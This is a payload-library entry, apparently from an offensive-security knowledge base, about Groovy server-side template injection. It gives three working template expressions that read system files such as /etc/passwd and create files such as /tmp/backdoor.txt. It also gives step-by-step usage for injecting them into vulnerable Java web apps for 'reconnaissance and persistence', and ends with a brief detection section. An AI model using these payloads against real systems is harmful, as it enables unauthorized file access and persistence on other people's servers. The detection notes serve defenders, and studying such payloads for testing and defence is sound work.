---
type: code
language: groovy
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Java
  - Web
tags:
  - ssti
  - file-manipulation
  - groovy
  - payload
validated: true
---

# groovy-ssti-file-manipulation-snippet

## Code

```groovy
${String x = new File('c:/windows/notepad.exe').text}
${String x = new File('/path/to/file').getText('UTF-8')}
${new File("C:\Temp\FileName.txt").createNewFile();}
```

## Description

This Groovy code snippet demonstrates chained file operations for SSTI exploitation: it first reads a Windows system file (notepad.exe) using the .text shorthand, then performs a parameterized read with explicit encoding, and finally creates a new file. It serves as a multi-purpose payload for testing and executing file read/write in vulnerable Groovy templates.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| /path/to/file | Target file path for the second read operation | /etc/passwd |
| C:\Temp\FileName.txt | Path for the new file creation (Windows-style) | /tmp/backdoor.txt |

## Usage

Inject this snippet into a vulnerable Groovy template input (e.g., a search parameter or user template field) in a Java web app. The expressions execute sequentially during rendering, allowing combined reconnaissance and persistence in one request. Use after confirming SSTI with a basic payload like ${7*7}. Follow up by reading the created file to write content if needed.

## Detection

- Web application logs showing Groovy exceptions or File I/O operations from unexpected sources.
- Filesystem monitoring for anomalous creations in temp or system directories.
- WAF alerts on ${...} patterns or File class usage in inputs.
- Network exfiltration of file contents via response bodies.

## Related

- [[procedures/Server-Side-Template-Injection-Groovy-File-Manipulation]]
- [[commands/groovy-read-file-text]]
- [[commands/groovy-create-new-file]]
